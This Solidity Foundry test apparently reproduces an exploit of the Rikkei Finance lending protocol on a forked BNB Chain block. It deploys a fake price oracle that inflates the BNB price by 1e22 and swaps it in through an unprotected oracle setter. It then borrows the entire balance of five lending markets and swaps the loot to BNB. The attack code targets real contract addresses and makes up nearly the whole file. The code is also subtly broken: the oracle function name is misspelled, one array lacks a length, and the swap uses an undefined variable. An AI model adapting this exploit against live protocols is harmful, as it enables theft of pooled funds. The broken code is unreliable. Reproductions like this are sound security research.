// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {IRToken} from "../interfaces/IRToken.sol";
import {IERC20} from "../interfaces/IERC20.sol";
import {IWETH9} from "../interfaces/IWETH9.sol";
import {TestHarness} from "../TestHarness.sol";

import {IPancakeRouter01} from "../utils/IPancakeRouter01.sol";
import {TokenBalanceTracker} from "../modules/TokenBalanceTracker.sol";

interface IUnitroller {
    function enterMarkets(
        address[] memory cTokens
    ) external payable returns (uint256[] memory);

    function exitMarket(address market) external;

    function borrowCaps(address market) external view returns (uint256);
}

interface ChainLinkOracle {
    function decimals() external view returns (uint8);

    function latestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updateAt,
            uint80 answeredInRound
        );
}

interface ISimpleOraclePrice {
    function setOracleData(address rToken, ChainLinkOracle _oracle) external;
}

contract MaliciousOracle is ChainLinkOracle {
    ChainLinkOracle bnbUSDOracle =
        ChainLinkOracle(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);

    function decimals() external view returns (uint8) {
        return bnbUSDOracle.decimals();
    }

    function lastestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updateAt,
            uint80 answeredInRound
        )
    {
        (roundId, answer, startedAt, updateAt, answeredInRound) = bnbUSDOracle
            .latestRoundData();
        answer = answer * 1e22;
        updateAt = block.timestamp;
    }
}

contract Exploit_Rikkei is TestHarness, TokenBalanceTracker {
    IRToken internal rBNB = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);

    IRToken[5] internal rTokens = [
        IRToken(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5), // rUSDC
        IRToken(0x53aBF990bF7A37FaA783A75FDD75bbcF8bdF11eB), // rBTC
        IRToken(0x9B9006cb01B1F664Ac25137D3a3a20b37d8bC078), // rDAI
        IRToken(0x383598668C025Be0798E90E7c5485Ff18D311063), // rUSDT
        IRToken(0x6db6A55E57AC8c90477bBF00ce874B988666553A) // rBUSD
    ];

    IWETH9 internal wbnb = IWETH9(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IERC20[5] internal tokens = [
        IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d), // USDC
        IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c), // BTCB
        IERC20(0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3), // DAI
        IERC20(0x55d398326f99059fF775485246999027B3197955), // BUSDT
        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) // BUSD
    ];
    IPancakeRouter01 internal router =
        IPancakeRouter01(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUnitroller internal unitroller =
        IUnitroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
    ISimpleOraclePrice internal priceOracle =
        ISimpleOraclePrice(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);

    function setUp() external {
        cheat.createSelectFork("bsc", 16956474);
        for (uint256 i = 0; i < tokens.length; i++) {
            addTokenToTracker(address(tokens[i]));
        }
        addTokenToTracker(address(rBNB));
        updateBalanceTracker(address(this));
    }

    receive() external payable {}

    function deployMaliciousOracle(
        uint256 _salt
    ) internal returns (address newOracleDeployed) {
        newOracleDeployed = address(
            new MaliciousOracle{salt: bytes32(_salt)}()
        );
    }

    function test_attack() external {
        logBalances(address(this));
        uint256 balanceBefore = rBNB.balanceOf(address(this));

        address maliciousOracle = deployMaliciousOracle(0);

        rBNB.mint{value: 0.0001 ether}();
        logBalances(address(this));

        rBNB.approve(address(unitroller), type(uint256).max);

        address[] memory uTokens = new address[](1);
        uTokens[0] = address(rBNB);
        unitroller.enterMarkets(uTokens);

        priceOracle.setOracleData(
            address(rBNB),
            ChainLinkOracle(maliciousOracle)
        );

        for (uint i = 0; i < 5; i++) {
            IRToken curRToken = rTokens[i];
            IERC20 curToken = tokens[i];

            uint256 poolBalance = curRToken.getCash();
            curRToken.borrow(poolBalance);
            curToken.approve(address(router), type(uint256).max);
            logBalances(address(this));

            address[] memory _path = new address[]();
            _path[0] = address(curToken);
            _path[1] = address(wbnb);

            router.swapExactTokensForETH(
                curToken.balanceOf(address(this)),
                1,
                path,
                address(this),
                1649992719
            );
            logBalances(address(this));
        }

        logBalances(address(this));
        uint256 balanceAfter = rBNB.balanceOf(address(this));
        assertGe(balanceAfter, balanceBefore);

        priceOracle.setOracleData(
            address(rBNB),
            ChainLinkOracle(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE)
        );
    }
}
